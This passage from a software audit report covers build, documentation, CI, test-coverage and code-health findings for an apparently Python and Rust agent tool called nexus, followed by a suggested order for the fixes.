Checked and fine: no production `unwrap`, `panic!` or `todo!` paths in
`rust/desktop/src`.

### F. Tests, docs, release and code health

**F1. The sdist probably cannot build the TUI (H).**
- `rust/tui/Cargo.toml:9` depends on `../widgets`, which `MANIFEST.in` does not
  include.
- Because the binary is optional, a source install would skip it silently.
- *Unverified*: no sdist was actually built.

*Fix:* include `rust/widgets` in `MANIFEST.in`. Add a CI step that builds from
the sdist and runs `nexus-ratatui --version`.

**F2. God modules (H).** The 15 largest:

| Module | Lines |
| --- | --- |
| `runtime.py` | 5,753 |
| `ext/manager.py` | 3,008 |
| `core/loop.py` | 2,593 |
| `mcp/client.py` | 2,524 |
| `session/session.py` | 2,375 |
| `context/manager.py` | 2,256 |
| `host/facade.py` | 2,120 |
| `agents/runner.py` | 2,072 |
| `tools/permissions.py` | 2,062 |
| `host/protocol.py` | 1,949 |
| `cli.py` | 1,921 |
| `mcp/bridge.py` | 1,878 |
| `tools/manager.py` | 1,817 |
| `agents/worktrees.py` | 1,757 |
| `mcp/manager.py` | 1,749 |

Ruff C901 flags 239 over-complex functions. The worst are `prototype.py:920`
`run` (148), `workflows.py:240` (110), `facade.py:1391` `_dispatch` (103) and
`loop.py:1739` `run_turn` (87).

*Fix:*
- Split `runtime.py`'s adapter classes into their own modules (permission gate,
  context coordinator, manifest factory, child runtime).
- Replace `_dispatch` with a handler table.
- Split `permissions.py` into rules, paths and engine/broker.
- Move trash out of `ext/manager.py`.

**F3. Docstrings cite deleted plan files (M).**
- `STATE_PLAN` is cited 46 times, `MOCK_PLAN` 17 times and `VOICE_PLAN` 10 times.
  These files were deleted in `208a7e2`, yet AGENTS.md and `docs/README.md:5` say
  they live in `plans/`.
- `CONTEXT_HEADER_TOOLS_PLAN.md` exists in both `done/` and `in-progress/`, and
  the two copies differ.

*Fix:* restore the ledgers to `plans/done/`, and keep one copy of each plan.

**F4. Broken root links, and the link test does not cover them (M).**
- `README.md:22` and `ARCHITECTURE.md:5` link `EXTENDING.md`.
- The README links the missing `plans/CLAUDE_AGENT_PLAN.md`.
- `tests/test_docs.py:24` checks only AGENTS.md and `docs/`.

**F5. README contradicts the code (M).**
- On Copilot: `README.md:435`, `964`.
- "Web frontend deferred": `:872`.
- "Use `summarize`": `:945`.

*Fix:* fix these, then remove the item from the known gaps.

**F6. `docs/release.md` describes CI wrongly (M).**
- It says there is no macOS job, but the only test job is macOS.
- The action versions are wrong.
- It says the update notice is "not built", but it is.
- It still has a stale migration-branch section.

**F7. CI coverage gaps (M).**
- Not run: `rust/desktop`, `rust/widgets` tests, the 8 Playwright checks, the PTY
  screenshot check, Python 3.14 (whose wheels ship), Linux (whose jobs are
  disabled but whose wheels ship) and `install.ps1`.

*Fix:* add cargo test/check for the desktop and widgets, a Python 3.14 leg, one
headless Playwright smoke run, and an Ubuntu job.

**F8. Docs-only PRs skip CI (M).** `ci.yml:4` uses `paths-ignore` for `**.md` and
`docs/**`, so `test_docs.py` and the packaged `agents/data/*.md` never run on
those changes.

**F9. Ruff is unpinned and missing from the dev extras (L).**

**F10. Stray tracked files (M).**
- `nexus.toml` holds a personal model choice and a dangling
  `instructions_file = "SOUL.md"`.
- `test.md` and `benchmark/test.md` are tracked.

*Fix:* remove them, or move the settings to `.agents/`.

**F11. Duplicated SearXNG config (L).** `websearch/` duplicates
`host_support/searchserver/`.

*Fix:* keep only the packaged copy.

**F12. A broken helper script (M).** `tests/mcp_search_native_fixture.py:20`
imports the deleted `visual_tui_demo`.

*Fix:* add a check that every `tests/*.py` helper imports.

**F13. Dead code and compatibility shims (L).**
- `ui_support/hints.py`, `ui/turn_stream.py`, `host/diagnostics.py`,
  `host/session_diagnostics.py` and `ui/desktop/wire_schedule.py`.
- `ui/cli/details.py` (see D5).

**F14. Examples predate `.agents/` (M/L).**
- `examples/nexus.toml:80` sets tool `dirs` without `.agents/tools`, which turns
  off the canonical directory.
- Capitalized tool names, `default_type = "general"` and `store = "jsonl"`.
- `examples/hooks.toml:1`, `examples/tools/greet.py` and `hooks/__init__.py:6`
  say `.nexus/`.

*Fix:* update them, and validate the examples against the live schema in a test.

**F15. No LICENSE and thin package metadata (M).** There is no root LICENSE, and
`pyproject.toml` has no `license`, `readme`, `urls` or `classifiers`, although
the package is published on PyPI.

**F16. Dependency hygiene (L).**
- The `httpcore==1.0.9` pin has no comment explaining it.
- Packages appear in both core deps and extras.
- `uvicorn` and `starlette` are used by tests but not declared.
- The `voice` extra comment is confusing.

**F17. No per-test timeout; 181 real sleeps (M).**
- There is no `pytest-timeout`, so a hung test runs until the 25-minute job
  limit.
- The PTY tests have the most sleeps (`test_ratatui_pty.py` has 33).

*Fix:* add `pytest-timeout` with a default of about 60 s, and replace the sleeps
with event waits.

**F18. Thin test coverage in some areas (M).**
- Ratio of test lines to source lines: `host_support` 0.82, `mcp` 0.86,
  `agents` 1.06 (compare `config` at 33).
- These modules have no direct test: `user_shell.py`, `presence.py`,
  `clipboard.py`, `settings_scope.py`, `worktree_projection.py`, `git_diff.py`,
  `last_choice.py` and `settings_pages/models.py`.
- There is no coverage tooling.

*Fix:* add `pytest-cov` and direct tests for these modules.

**F19. Latent async bugs (M).**
- 6 × B023 loop-variable closures.
- 32 × blind `except`.
- 17 × blocking path I/O in async functions.
- A busy-wait at `mcp/client.py:1399`.

*Fix:* enable `RUF006`, `B023` and `ASYNC110`.

**F20. Test files named by plan phase (L).** `test_phase6_integration.py`
(2,363 lines) and its siblings break the `test_<area>_*` convention.

**F21. Local clutter and doc errors (L).**
- 7 prunable worktrees.
- A stale `build/` directory.
- `decisions.md:165` says `design-mockups/` was removed; it exists as a Rust
  crate.

**F22. `design.md` and `ARCHITECTURE.md` duplicate `docs/` (L).**

*Fix:* replace each with a pointer, or archive it.

**F23. No TODO or FIXME markers in production code (informational).** Debt lives
in the known gaps of `decisions.md` and in the plans, so keep those current.

## 3. Suggested order

Each step is independently shippable. Every change updates its matching `docs/`
page, per AGENTS.md.

1. **Stop the bleeding (correctness and security, small diffs):**
   - B1 (trashed-session loop)
   - C1 (bash glob chaining)
   - C2 (`$HOME` roots)
   - C3 (credential read-deny)
   - E1 (desktop picker Enter)
   - D1 (CLI control escaping)
   - B15 (NAT64)
   - F1 (sdist widgets)
2. **Context fidelity (the core promise):**
   - A1 (evict only past threshold)
   - A2 (announce drop and evict)
   - A4 (token estimates and overflow retry)
   - A3 (wire a summarizer with a low-water mark)
   - A10 (keep partial output)
   - A11 (fallback re-assembly)
3. **Bound everything:**
   - A5 (turn limits)
   - C5 (tool timeout)
   - C6 (job cap)
   - A8 (SSE decoder)
   - B5 (oversized results)
   - B6 (UDS timeouts and overflow)
   - B14 (log rotation)
   - E5 and E10 (desktop stdin and stdout)
4. **Daemon durability:**
   - B3 (deltas live-only, writer thread)
   - B2 (purge trash)
   - B7 (restored queue)
   - B4 (replay parity)
   - B8 (stale pid)
   - B11 (protocol skew)
   - C8 (worktree recovery)
   - C4 (hook failure policy)
   - B20 (tracked tasks)
5. **Show context clearly everywhere:**
   - D2 and D3 (replay and run tool rows)
   - D5 and D6 (details, cost and permission prompt)
   - D7, D8, E8 and A16 (announce clipping)
   - D4 (`/help`)
6. **CI and hygiene:**
   - F7 and F8 (CI coverage)
   - F17 (test timeouts)
   - F19 (ruff rules)
   - F3, F4, F5, F6, F14 and the A18/D17/E21 docs fixes
   - F10, F12 and F13 (stray files, broken helper, dead code)
   - F15 (LICENSE)
7. **Performance:**
   - A13 (catalogue)
   - A9 (token counting)
   - D10 (lazy host imports)
   - E2, E3, E6 and E7 (desktop caching and projection)
   - B10 (presence)
   - D22 (static data in projections)
8. **Roadmap items:**
   - E16 (web removal: warn first, then delete)
   - E12 (desktop overhaul Phase 1, then onward)
   - C7 (job completion events)
   - C10 (ext restore)
   - D12, E9 and D13 (shared ranking and approval keys)
   - D15 and F2 (split the bridge and the god modules, done in small steps
     alongside feature work, not as one big rewrite)
9. **Verification debt:** D16 and E13 (PTY and native screenshot checks for
   everything marked "not verified").
